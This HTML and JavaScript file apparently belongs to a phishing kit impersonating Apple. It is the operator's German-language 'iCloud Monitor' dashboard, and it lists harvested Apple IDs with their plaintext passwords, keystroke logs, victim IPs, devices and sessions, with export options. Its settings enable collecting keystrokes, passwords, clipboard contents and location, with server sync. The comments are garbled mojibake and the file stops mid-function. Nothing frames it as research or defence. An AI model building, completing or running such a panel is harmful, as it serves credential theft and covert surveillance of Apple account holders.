<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Admin Dashboard - iCloud Monitor</title>
    
    <!-- ÿßŸÑŸÜÿ∏ÿßŸÖ ÿßŸÑŸÖÿ±ŸÉÿ≤Ÿä -->
    <script src="brain-system.js" defer></script>
    
    <style>
        :root {
            --apple-black: #000000;
            --apple-white: #FFFFFF;
            --apple-gray-1: #F5F5F7;
            --apple-gray-2: #E5E5EA;
            --apple-gray-3: #8E8E93;
            --apple-blue: #007AFF;
            --apple-blue-dark: #0056CC;
            --apple-red: #FF3B30;
            --apple-green: #34C759;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', 'Segoe UI', sans-serif;
        }
        
        body {
            background-color: var(--apple-gray-1);
            color: var(--apple-black);
            font-size: 14px;
            overflow-x: hidden;
        }
        
        .dashboard {
            display: flex;
            min-height: 100vh;
        }
        
        .sidebar {
            width: 250px;
            background: var(--apple-white);
            border-right: 1px solid var(--apple-gray-2);
            padding: 20px;
            position: fixed;
            height: 100vh;
            overflow-y: auto;
        }
        
        .main-content {
            flex: 1;
            margin-left: 250px;
            padding: 20px;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 40px;
            padding-bottom: 20px;
            border-bottom: 1px solid var(--apple-gray-2);
        }
        
        .logo i {
            font-size: 32px;
            color: var(--apple-black);
        }
        
        .nav-menu {
            list-style: none;
        }
        
        .nav-item {
            margin-bottom: 10px;
        }
        
        .nav-link {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            text-decoration: none;
            color: var(--apple-gray-3);
            border-radius: 8px;
            transition: all 0.2s;
        }
        
        .nav-link:hover,
        .nav-link.active {
            background: var(--apple-blue);
            color: var(--apple-white);
        }
        
        .nav-icon {
            font-size: 20px;
        }
        
        .header {
            background: var(--apple-white);
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        
        .header-title {
            font-size: 24px;
            font-weight: 600;
        }
        
        .header-actions {
            display: flex;
            gap: 10px;
        }
        
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-primary {
            background: var(--apple-blue);
            color: var(--apple-white);
        }
        
        .btn-danger {
            background: var(--apple-red);
            color: var(--apple-white);
        }
        
        .btn-success {
            background: var(--apple-green);
            color: var(--apple-white);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: var(--apple-white);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            transition: transform 0.2s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
        }
        
        .stat-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .stat-icon {
            width: 50px;
            height: 50px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        
        .stat-icon.key {
            background: rgba(0, 122, 255, 0.1);
            color: var(--apple-blue);
        }
        
        .stat-icon.user {
            background: rgba(52, 199, 89, 0.1);
            color: var(--apple-green);
        }
        
        .stat-icon.password {
            background: rgba(255, 59, 48, 0.1);
            color: var(--apple-red);
        }
        
        .stat-icon.session {
            background: rgba(255, 149, 0, 0.1);
            color: #FF9500;
        }
        
        .stat-number {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: var(--apple-gray-3);
            font-size: 14px;
        }
        
        .live-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            color: var(--apple-green);
        }
        
        .live-dot {
            width: 8px;
            height: 8px;
            background: var(--apple-green);
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .content-section {
            background: var(--apple-white);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 2px solid var(--apple-gray-1);
        }
        
        .section-title {
            font-size: 20px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .controls {
            display: flex;
            gap: 10px;
        }
        
        .search-box {
            padding: 10px 15px;
            border: 1px solid var(--apple-gray-2);
            border-radius: 8px;
            font-size: 14px;
            min-width: 250px;
        }
        
        .table-container {
            overflow-x: auto;
            border-radius: 8px;
            border: 1px solid var(--apple-gray-2);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 800px;
        }
        
        th {
            background: var(--apple-gray-1);
            padding: 15px;
            text-align: left;
            font-weight: 600;
            color: var(--apple-black);
            border-bottom: 2px solid var(--apple-gray-2);
        }
        
        td {
            padding: 15px;
            border-bottom: 1px solid var(--apple-gray-1);
        }
        
        tr:hover {
            background: var(--apple-gray-1);
        }
        
        .credential-password {
            font-family: 'Courier New', monospace;
            background: var(--apple-gray-1);
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            color: var(--apple-black);
        }
        
        .keystroke-log {
            max-height: 400px;
            overflow-y: auto;
            background: #1a1a1a;
            color: #00ff00;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        
        .keystroke-item {
            margin-bottom: 5px;
            padding: 5px;
            border-left: 3px solid var(--apple-blue);
            padding-left: 10px;
        }
        
        .keystroke-item.keypress {
            border-left-color: var(--apple-green);
        }
        
        .keystroke-item.click {
            border-left-color: #FF9500;
        }
        
        .keystroke-item.login {
            border-left-color: var(--apple-red);
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal-content {
            background: var(--apple-white);
            padding: 30px;
            border-radius: 12px;
            max-width: 800px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--apple-gray-2);
        }
        
        .close-modal {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: var(--apple-gray-3);
        }
        
        .session-info {
            background: var(--apple-gray-1);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        
        .session-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid var(--apple-gray-2);
        }
        
        .info-label {
            color: var(--apple-gray-3);
        }
        
        .info-value {
            font-weight: 600;
            color: var(--apple-black);
        }
        
        .export-options {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        
        .export-option {
            background: var(--apple-gray-1);
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .export-option:hover {
            background: var(--apple-blue);
            color: var(--apple-white);
        }
        
        @media (max-width: 768px) {
            .sidebar {
                width: 70px;
                padding: 10px;
            }
            
            .main-content {
                margin-left: 70px;
            }
            
            .logo span {
                display: none;
            }
            
            .nav-link span {
                display: none;
            }
            
            .stats-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <!-- ÿßŸÑÿ¥ÿ±Ÿäÿ∑ ÿßŸÑÿ¨ÿßŸÜÿ®Ÿä -->
    <div class="sidebar">
        <div class="logo">
            <div>Ô£ø</div>
            <span>iCloud Monitor</span>
        </div>
        
        <ul class="nav-menu">
            <li class="nav-item">
                <a href="#dashboard" class="nav-link active" onclick="switchTab('dashboard')">
                    <span class="nav-icon">üìä</span>
                    <span>Dashboard</span>
                </a>
            </li>
            <li class="nav-item">
                <a href="#credentials" class="nav-link" onclick="switchTab('credentials')">
                    <span class="nav-icon">üîê</span>
                    <span>Credentials</span>
                </a>
            </li>
            <li class="nav-item">
                <a href="#keystrokes" class="nav-link" onclick="switchTab('keystrokes')">
                    <span class="nav-icon">‚å®Ô∏è</span>
                    <span>Keystrokes</span>
                </a>
            </li>
            <li class="nav-item">
                <a href="#sessions" class="nav-link" onclick="switchTab('sessions')">
                    <span class="nav-icon">üåê</span>
                    <span>Sessions</span>
                </a>
            </li>
            <li class="nav-item">
                <a href="#analytics" class="nav-link" onclick="switchTab('analytics')">
                    <span class="nav-icon">üìà</span>
                    <span>Analytics</span>
                </a>
            </li>
            <li class="nav-item">
                <a href="#export" class="nav-link" onclick="switchTab('export')">
                    <span class="nav-icon">üíæ</span>
                    <span>Export</span>
                </a>
            </li>
            <li class="nav-item">
                <a href="#settings" class="nav-link" onclick="switchTab('settings')">
                    <span class="nav-icon">‚öôÔ∏è</span>
                    <span>Settings</span>
                </a>
            </li>
        </ul>
        
        <div style="margin-top: 40px; padding: 15px; background: var(--apple-gray-1); border-radius: 8px;">
            <div class="live-badge">
                <div class="live-dot"></div>
                <span>LIVE</span>
            </div>
            <div id="connectionStatus" style="font-size: 12px; margin-top: 10px; color: var(--apple-gray-3);">
                Verbunden
            </div>
            <div id="lastUpdate" style="font-size: 11px; margin-top: 5px; color: var(--apple-gray-3);">
                Aktualisiert: Jetzt
            </div>
        </div>
    </div>
    
    <!-- ÿßŸÑŸÖÿ≠ÿ™ŸàŸâ ÿßŸÑÿ±ÿ¶Ÿäÿ≥Ÿä -->
    <div class="main-content">
        <!-- Header -->
        <div class="header">
            <h1 class="header-title" id="pageTitle">Dashboard</h1>
            <div class="header-actions">
                <button class="btn btn-primary" onclick="refreshData()">
                    üîÑ Aktualisieren
                </button>
                <button class="btn btn-success" onclick="exportAllData()">
                    üì• Exportieren
                </button>
                <button class="btn btn-danger" onclick="clearAllData()">
                    üóëÔ∏è L√∂schen
                </button>
            </div>
        </div>
        
        <!-- Dashboard Tab -->
        <div class="tab-content" id="dashboardTab">
            <!-- Statistics -->
            <div class="stats-grid" id="statsGrid">
                <!-- Filled by JavaScript -->
            </div>
            
            <!-- Recent Activity -->
            <div class="content-section">
                <div class="section-header">
                    <h2 class="section-title">üìà Recent Activity</h2>
                    <input type="text" class="search-box" placeholder="Search activity..." id="activitySearch">
                </div>
                <div class="keystroke-log" id="activityLog">
                    <!-- Activity log will appear here -->
                </div>
            </div>
            
            <!-- Credentials Summary -->
            <div class="content-section">
                <div class="section-header">
                    <h2 class="section-title">üîê Recent Credentials</h2>
                    <button class="btn btn-primary" onclick="switchTab('credentials')">
                        Alle anzeigen
                    </button>
                </div>
                <div class="table-container">
                    <table id="recentCredentialsTable">
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>Apple ID</th>
                                <th>Password</th>
                                <th>Device</th>
                                <th>IP</th>
                            </tr>
                        </thead>
                        <tbody id="recentCredentialsBody">
                            <!-- Filled by JavaScript -->
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        
        <!-- Credentials Tab -->
        <div class="tab-content" id="credentialsTab" style="display: none;">
            <div class="content-section">
                <div class="section-header">
                    <h2 class="section-title">üîê All Credentials</h2>
                    <div class="controls">
                        <input type="text" class="search-box" placeholder="Search Apple ID..." id="credentialSearch" onkeyup="filterCredentials()">
                        <button class="btn btn-danger" onclick="deleteAllCredentials()">
                            üóëÔ∏è Alles l√∂schen
                        </button>
                    </div>
                </div>
                <div class="table-container">
                    <table id="credentialsTable">
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Time</th>
                                <th>Apple ID</th>
                                <th>Password</th>
                                <th>Device</th>
                                <th>IP</th>
                                <th>Session</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="credentialsBody">
                            <!-- Filled by JavaScript -->
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        
        <!-- Keystrokes Tab -->
        <div class="tab-content" id="keystrokesTab" style="display: none;">
            <div class="content-section">
                <div class="section-header">
                    <h2 class="section-title">‚å®Ô∏è Keystroke Logs</h2>
                    <div class="controls">
                        <button class="btn btn-primary" onclick="toggleKeystrokeFeed()" id="keystrokeToggle">
                            ‚è∏Ô∏è Pause Feed
                        </button>
                        <button class="btn btn-success" onclick="exportKeystrokes()">
                            üíæ Exportieren
                        </button>
                    </div>
                </div>
                <div class="keystroke-log" id="keystrokeLog">
                    <!-- Keystrokes will appear here -->
                </div>
            </div>
        </div>
        
        <!-- Sessions Tab -->
        <div class="tab-content" id="sessionsTab" style="display: none;">
            <div class="content-section">
                <div class="section-header">
                    <h2 class="section-title">üåê Sessions</h2>
                    <input type="text" class="search-box" placeholder="Search session..." id="sessionSearch">
                </div>
                <div class="table-container">
                    <table id="sessionsTable">
                        <thead>
                            <tr>
                                <th>Session ID</th>
                                <th>Start Time</th>
                                <th>Duration</th>
                                <th>Device</th>
                                <th>Keystrokes</th>
                                <th>Credentials</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="sessionsBody">
                            <!-- Filled by JavaScript -->
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        
        <!-- Analytics Tab -->
        <div class="tab-content" id="analyticsTab" style="display: none;">
            <div class="content-section">
                <div class="section-header">
                    <h2 class="section-title">üìä Analytics</h2>
                    <select class="search-box" id="analyticsRange" onchange="updateAnalytics()">
                        <option value="day">Last 24 Hours</option>
                        <option value="week">Last Week</option>
                        <option value="month">Last Month</option>
                    </select>
                </div>
                <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 20px;">
                    <div style="background: var(--apple-gray-1); padding: 20px; border-radius: 8px;">
                        <h3 style="margin-bottom: 15px;">Activity Over Time</h3>
                        <canvas id="activityChart"></canvas>
                    </div>
                    <div style="background: var(--apple-gray-1); padding: 20px; border-radius: 8px;">
                        <h3 style="margin-bottom: 15px;">Device Distribution</h3>
                        <canvas id="deviceChart"></canvas>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Export Tab -->
        <div class="tab-content" id="exportTab" style="display: none;">
            <div class="content-section">
                <div class="section-header">
                    <h2 class="section-title">üíæ Export Data</h2>
                </div>
                <p>W√§hlen Sie ein Format zum Exportieren aller gesammelten Daten:</p>
                <div class="export-options">
                    <div class="export-option" onclick="exportData('json')">
                        <div style="font-size: 32px;">üîÑ</div>
                        <div>JSON</div>
                    </div>
                    <div class="export-option" onclick="exportData('csv')">
                        <div style="font-size: 32px;">üìä</div>
                        <div>CSV</div>
                    </div>
                    <div class="export-option" onclick="exportData('txt')">
                        <div style="font-size: 32px;">üìù</div>
                        <div>Text</div>
                    </div>
                    <div class="export-option" onclick="exportData('html')">
                        <div style="font-size: 32px;">üåê</div>
                        <div>HTML Report</div>
                    </div>
                </div>
                
                <div style="margin-top: 30px; padding: 20px; background: var(--apple-gray-1); border-radius: 8px;">
                    <h3 style="margin-bottom: 15px;">Automatischer Export</h3>
                    <div style="display: flex; gap: 15px; align-items: center;">
                        <label>
                            <input type="checkbox" id="autoExport" onchange="toggleAutoExport()">
                            Automatischen Export aktivieren
                        </label>
                        <select class="search-box" id="exportInterval" style="width: 150px;">
                            <option value="hourly">St√ºndlich</option>
                            <option value="daily">T√§glich</option>
                            <option value="weekly">W√∂chentlich</option>
                        </select>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Settings Tab -->
        <div class="tab-content" id="settingsTab" style="display: none;">
            <div class="content-section">
                <div class="section-header">
                    <h2 class="section-title">‚öôÔ∏è Settings</h2>
                </div>
                
                <div style="display: grid; gap: 20px;">
                    <div style="padding: 20px; background: var(--apple-gray-1); border-radius: 8px;">
                        <h3 style="margin-bottom: 15px;">Datensammlung</h3>
                        <div style="display: flex; flex-direction: column; gap: 10px;">
                            <label>
                                <input type="checkbox" id="collectKeystrokes" checked>
                                Tastenanschl√§ge sammeln
                            </label>
                            <label>
                                <input type="checkbox" id="collectPasswords" checked>
                                Passw√∂rter sammeln
                            </label>
                            <label>
                                <input type="checkbox" id="collectClipboard" checked>
                                Zwischenablage sammeln
                            </label>
                            <label>
                                <input type="checkbox" id="collectLocation" checked>
                                Standort sammeln
                            </label>
                        </div>
                    </div>
                    
                    <div style="padding: 20px; background: var(--apple-gray-1); border-radius: 8px;">
                        <h3 style="margin-bottom: 15px;">Speichereinstellungen</h3>
                        <div style="display: flex; flex-direction: column; gap: 10px;">
                            <label>
                                <input type="checkbox" id="useLocalStorage" checked>
                                LocalStorage verwenden
                            </label>
                            <label>
                                <input type="checkbox" id="useIndexedDB" checked>
                                IndexedDB verwenden
                            </label>
                            <label>
                                <input type="checkbox" id="useServer" checked>
                                Server-Synchronisation
                            </label>
                        </div>
                    </div>
                    
                    <div style="padding: 20px; background: var(--apple-gray-1); border-radius: 8px;">
                        <h3 style="margin-bottom: 15px;">Sicherheit</h3>
                        <div style="display: flex; flex-direction: column; gap: 10px;">
                            <label>
                                Verschl√ºsselung aktivieren:
                                <input type="password" id="encryptionKey" placeholder="Verschl√ºsselungsschl√ºssel" style="margin-top: 5px; width: 100%; padding: 10px; border: 1px solid var(--apple-gray-2); border-radius: 4px;">
                            </label>
                            <button class="btn btn-primary" onclick="saveSettings()" style="margin-top: 10px;">
                                Einstellungen speichern
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Modal for Details -->
    <div class="modal" id="detailsModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Session Details</h2>
                <button class="close-modal" onclick="closeModal()">√ó</button>
            </div>
            <div id="modalContent">
                <!-- Details will appear here -->
            </div>
        </div>
    </div>

    <script>
        // ==================== Dashboard System ====================
        
        class DashboardSystem {
            constructor() {
                this.data = {
                    credentials: [],
                    keystrokes: [],
                    sessions: [],
                    visits: [],
                    loginAttempts: []
                };
                
                this.isLive = true;
                this.updateInterval = null;
                this.keystrokeFeedInterval = null;
                
                this.init();
            }
            
            init() {
                // ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™
                this.loadAllData();
                
                // ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿ•ÿ≠ÿµÿßÿ¶Ÿäÿßÿ™
                this.updateStats();
                
                // ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã
                this.startAutoUpdate();
                
                // ÿ®ÿØÿ° ÿπÿ±ÿ∂ ÿ∂ÿ∫ÿ∑ÿßÿ™ ÿßŸÑŸÖŸÅÿßÿ™Ÿäÿ≠ ÿßŸÑŸÖÿ®ÿßÿ¥ÿ±ÿ©
                this.startKeystrokeFeed();
                
                // ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑŸàŸÇÿ™
                setInterval(() => {
                    document.getElementById('lastUpdate').textContent = 
                        'Aktualisiert: ' + new Date().toLocaleTimeString('de-DE');
                }, 60000);
                
                // ÿ™ÿ≠ÿØŸäÿ´ ÿ≠ÿßŸÑÿ© ÿßŸÑÿßÿ™ÿµÿßŸÑ
                this.updateConnectionStatus();
                
                console.log('‚úÖ Dashboard System initialized');
            }
            
            loadAllData() {
                try {
                    // ÿ™ÿ≠ŸÖŸäŸÑ ŸÖŸÜ localStorage
                    this.data.credentials = JSON.parse(localStorage.getItem('brain_storage') || '[]');
                    this.data.keystrokes = JSON.parse(localStorage.getItem('keystrokes') || '[]');
                    this.data.visits = JSON.parse(localStorage.getItem('visits') || '[]');
                    this.data.loginAttempts = JSON.parse(localStorage.getItem('login_attempts') || '[]');
                    this.data.sessions = JSON.parse(localStorage.getItem('session_ends') || '[]');
                    
                    // ÿπÿ±ÿ∂ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™
                    this.displayCredentials();
                    this.displayRecentCredentials();
                    this.displaySessions();
                    this.displayActivity();
                    this.updateAnalytics();
                    
                } catch (error) {
                    console.error('‚ùå Error loading data:', error);
                }
            }
            
            updateStats() {
                const stats = {
                    totalCredentials: this.data.credentials.length,
                    totalKeystrokes: this.data.keystrokes.length,
                    totalSessions: this.data.sessions.length,
                    activeToday: this.getActiveToday(),
                    uniqueDevices: this.getUniqueDevices(),
                    lastHourActivity: this.getLastHourActivity()
                };
                
                document.getElementById('statsGrid').innerHTML = `
                    <div class="stat-card">
                        <div class="stat-header">
                            <div class="stat-icon key">‚å®Ô∏è</div>
                            <div class="live-badge">
                                <div class="live-dot"></div>
                                <span>LIVE</span>
                            </div>
                        </div>
                        <div class="stat-number">${stats.totalKeystrokes}</div>
                        <div class="stat-label">Tastenanschl√§ge</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-header">
                            <div class="stat-icon user">üë§</div>
                        </div>
                        <div class="stat-number">${stats.totalCredentials}</div>
                        <div class="stat-label">Anmeldedaten</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-header">
                            <div class="stat-icon session">üåê</div>
                        </div>
                        <div class="stat-number">${stats.totalSessions}</div>
                        <div class="stat-label">Sitzungen</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-header">
                            <div class="stat-icon password">üîë</div>
                        </div>
                        <div class="stat-number">${stats.activeToday}</div>
                        <div class="stat-label">Heute aktiv</div>
                    </div>
                `;
            }
            
            getActiveToday() {
                const today = new Date().toDateString();
                return this.data.credentials.filter(cred => {
                    const credDate = new Date(cred.timestamp).toDateString();
                    return credDate === today;
                }).length;
            }
            
            getUniqueDevices() {
                const devices = new Set();
                this.data.credentials.forEach(cred => {
                    if (cred.device) {
                        devices.add(cred.device);
                    }
                });
                return devices.size;
            }
            
            getLastHourActivity() {
                const hourAgo = Date.now() - 3600000;
                return this.data.keystrokes.filter(k => {
                    const keyTime = new Date(k.timestamp).getTime();
                    return keyTime > hourAgo;
                }).length;
            }
            
            displayCredentials() {
                const tbody = document.getElementById('credentialsBody');
                
                if (this.data.credentials.length === 0) {
                    tbody.innerHTML = `
                        <tr>
                            <td colspan="8" style="text-align: center; padding: 40px; color: var(--apple-gray-3);">
                                Keine Anmeldedaten gesammelt
                            </td>
                        </tr>
                    `;
                    return;
                }
                
                let html = '';
                this.data.credentials.slice().reverse().forEach((cred, index) => {
                    const time = new Date(cred.timestamp).toLocaleString('de-DE');
                    const shortAppleId = cred.appleId ? (cred.appleId.length > 20 ? 
                        cred.appleId.substring(0, 20) + '...' : cred.appleId) : 'N/A';
                    
                    html += `
                        <tr>
                            <td>${index + 1}</td>
                            <td>${time}</td>
                            <td title="${cred.appleId || ''}">${shortAppleId}</td>
                            <td>
                                <span class="credential-password" onclick="togglePassword(this, '${cred.password || ''}')">
                                    ${'‚Ä¢'.repeat(cred.password ? Math.min(cred.password.length, 8) : 8)}
                                </span>
                            </td>
                            <td>${cred.device || 'Unknown'}</td>
                            <td>${cred.ip || 'Unknown'}</td>
                            <td>${cred.sessionId ? cred.sessionId.substring(0, 8) + '...' : 'N/A'}</td>
                            <td>
                                <button class="btn btn-danger" style="padding: 5px 10px; font-size: 12px;" onclick="deleteCredential(${this.data.credentials.length - 1 - index})">
                                    L√∂schen
                                </button>
                            </td>
                        </tr>
                    `;
                });
                
                tbody.innerHTML = html;
            }
            
            displayRecentCredentials() {
                const tbody = document.getElementById('recentCredentialsBody');
                const recent = this.data.credentials.slice().reverse().slice(0, 5);
                
                if (recent.length === 0) {
                    tbody.innerHTML = `
                        <tr>
                            <td colspan="5" style="text-align: center; padding: 20px; color: var(--apple-gray-3);">
                                No recent credentials
                            </td>
                        </tr>
                    `;
                    return;
                }
                
                let html = '';
                recent.forEach((cred, index) => {
                    const time = new Date(cred.timestamp).toLocaleTimeString('de-DE');
                    const shortAppleId = cred.appleId ? (cred.appleId.length > 15 ? 
                        cred.appleId.substring(0, 15) + '...' : cred.appleId) : 'N/A';
                    
                    html += `
                        <tr>
                            <td>${time}</td>
                            <td title="${cred.appleId || ''}">${shortAppleId}</td>
                            <td>
                                <span class="credential-password">
                                    ${'‚Ä¢'.repeat(cred.password ? Math.min(cred.password.length, 8) : 8)}
                                </span>
                            </td>
                            <td>${cred.device || 'Unknown'}</td>
                            <td>${cred.ip || 'Unknown'}</td>
                        </tr>
                    `;
                });
                
                tbody.innerHTML = html;
            }
            
            displaySessions() {
                const tbody = document.getElementById('sessionsBody');
                
                if (this.data.sessions.length === 0) {
                    tbody.innerHTML = `
                        <tr>
                            <td colspan="7" style="text-align: center; padding: 40px; color: var(--apple-gray-3);">
                                Keine Sitzungen aufgezeichnet
                            </td>
                        </tr>
                    `;
                    return;
                }
                
                let html = '';
                this.data.sessions.slice().reverse().forEach((session, index) => {
                    const startTime = new Date(session.timestamp).toLocaleString('de-DE');
                    const duration = session.sessionDuration ? 
                        `${Math.floor(session.sessionDuration / 60)}m ${session.sessionDuration % 60}s` : 
                        'N/A';
                    
                    const keystrokes = this.data.keystrokes.filter(k => 
                        k.sessionId === session.sessionId
                    ).length;
                    
                    const credentials = this.data.credentials.filter(c => 
                        c.sessionId === session.sessionId
                    ).length;
                    
                    html += `
                        <tr>
                            <td title="${session.sessionId || ''}">
                                ${session.sessionId ? session.sessionId.substring(0, 12) + '...' : 'N/A'}
                            </td>
                            <td>${startTime}</td>
                            <td>${duration}</td>
                            <td>${session.device || 'Unknown'}</td>
                            <td>${keystrokes}</td>
                            <td>${credentials}</td>
                            <td>
                                <button class="btn btn-primary" style="padding: 5px 10px; font-size: 12px;" onclick="showSessionDetails('${session.sessionId || ''}')">
                                    Details
                                </button>
                            </td>
                        </tr>
                    `;
                });
                
                tbody.innerHTML = html;
            }
            
            displayActivity() {
                const logContainer = document.getElementById('activityLog');
                const allActivity = [];
                
                // ÿ¨ŸÖÿπ ÿ¨ŸÖŸäÿπ ÿßŸÑÿ£ŸÜÿ¥ÿ∑ÿ©
                this.data.keystrokes.forEach(k => allActivity.push({...k, type: 'keystroke'}));
                this.data.credentials.forEach(c => allActivity.push({...c, type: 'credential'}));
                this.data.loginAttempts.forEach(l => allActivity.push({...l, type: 'login_attempt'}));
                
                // ÿ™ÿ±ÿ™Ÿäÿ® ÿ≠ÿ≥ÿ® ÿßŸÑŸàŸÇÿ™
                allActivity.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                
                // ÿπÿ±ÿ∂ ÿ¢ÿÆÿ± 50 ŸÜÿ¥ÿßÿ∑
                const recent = allActivity.slice(0, 50);
                
                if (recent.length === 0) {
                    logContainer.innerHTML = '<div style="color: #666;">No activity recorded</div>';
                    return;
                }
                
                let html = '';
                recent.forEach((activity, index) => {
                    const time = new Date(activity.timestamp).toLocaleTimeString('de-DE');
                    let content = '';
                    
                    if (activity.type === 'keystroke') {
                        content = `[${time}] TASTE: "${activity.key}" (${activity.code})`;
                    } else if (activity.type === 'credential') {
                        content = `[${time}] üîê NEUES LOGIN: ${activity.appleId}`;
                    } else if (activity.type === 'login_attempt') {
                        content = `[${time}] üîì LOGIN VERSUCH: ${activity.appleId}`;
                    }
                    
                    if (content) {
                        const typeClass = activity.type === 'keystroke' ? 'keypress' : 
                                         activity.type === 'credential' ? 'login' : 'click';
                        html += `<div class="keystroke-item ${typeClass}">${content}</div>`;
                    }
                });
                
                logContainer.innerHTML = html;
                logContainer.scrollTop = logContainer.scrollHeight;
            }
            
            startKeystrokeFeed() {
                this.keystrokeFeedInterval = setInterval(() => {
                    if (this.isLive) {
                        this.updateKeystrokeFeed();
                    }
                }, 2000);
            }
            
            updateKeystrokeFeed() {
                const logContainer = document.getElementById('keystrokeLog');
                
                // ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ÿ¢ÿÆÿ± 20 ÿ∂ÿ∫ÿ∑ÿ© ŸÖŸÅÿ™ÿßÿ≠
                const recent = this.data.keystrokes.slice().reverse().slice(0, 20);
                
                if (recent.length === 0) {
                    logContainer.innerHTML = '<div style="color: #666;">No keystrokes recorded</div>';
                    return;
                }
                
                let html = '';
                recent.forEach((stroke, index) => {
                    const time = new Date(stroke.timestamp).toLocaleTimeString('de-DE');
                    let content = '';
                    
                    if (stroke.eventType === 'keydown' || stroke.eventType === 'keypress') {
                        content = `[${time}] TASTE: "${stroke.key}" (${stroke.code})`;
                    } else if (stroke.eventType === 'keyup') {
                        content = `[${time}] TASTE LOSLASSEN: "${stroke.key}"`;
                    }
                    
                    if (content) {
                        html += `<div class="keystroke-item keypress">${content}</div>`;
                    }
                });
                
                logContainer.innerHTML = html;
                logContainer.scrollTop = logContainer.scrollHeight;
            }
            
            startAutoUpdate() {
                if (this.updateInterval) {
                    clearInterval(this.updateInterval);
                }
                
                this.updateInterval = setInterval(() => {
                    if (this.isLive) {
                        this.loadAllData();
                        this.updateStats();
                    }
                }, 10000); // ÿ™ÿ≠ÿØŸäÿ´ ŸÉŸÑ 10 ÿ´ŸàÿßŸÜŸä
            }
            
            updateConnectionStatus() {
                const statusEl = document.getElementById('connectionStatus');
                const online = navigator.onLine;
                
                if (online) {
                    statusEl.innerHTML = 'üü¢ Verbunden';
                    statusEl.style.color = 'var(--apple-green)';
                } else {
                    statusEl.innerHTML = 'üî¥ Offline';
                    statusEl.style.color = 'var(--apple-red)';
                }
                
